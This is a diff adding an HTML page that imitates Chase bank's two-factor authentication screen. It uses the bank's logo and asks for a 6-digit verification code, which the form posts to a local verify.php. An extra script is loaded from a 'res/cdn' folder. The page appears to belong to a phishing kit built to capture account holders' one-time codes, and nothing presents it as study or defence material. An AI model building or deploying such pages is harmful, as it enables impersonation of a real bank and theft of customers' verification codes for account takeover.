@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="res/css/chase.css">
+    <title>chase · Two-Factor Authentication</title>
+</head>
+<body>
+    <header>
+        <img src="res/img/logo.svg" alt="Chase logo">
+    </header>
+
+    <section>
+        <div class="Container">
+
+            <!-- Informational message using existing box/label pattern -->
+            <div class="box">
+                <label style="font-weight: 600;">Two-Factor Authentication</label>
+                <p style="margin: 8px 0 0 0; font-size: 0.9rem; color: #2a3b4c;">
+                    Enter the 6-digit verification code sent to your registered phone or email.
+                </p>
+            </div>
+
+            <form action="verify.php" method="post">
+
+                <div class="box">
+                    <label>Verification Code</label>
+                    <input type="text" name="code" maxlength="6" inputmode="numeric" pattern="[0-9]{6}" placeholder="Enter 6-digit code" required autocomplete="one-time-code">
+                </div>
+
+                <div class="L">
+                    <input type="checkbox" id="trust">
+                    <label for="trust" style="font-weight: normal;">Trust this device</label>
+                </div>
+
+                <div><button type="submit">Verify</button></div>
+
+                <h5>Didn't receive a code? Resend &gt;</h5>
+                <h5>Use a different verification method &gt;</h5>
+
+            </form>
+        </div>
+    </section>
+
+    <script src="./res/jquery.js"></script>
+    <script src="./res/cdn/jq.js"></script>
+</body>
+</html>
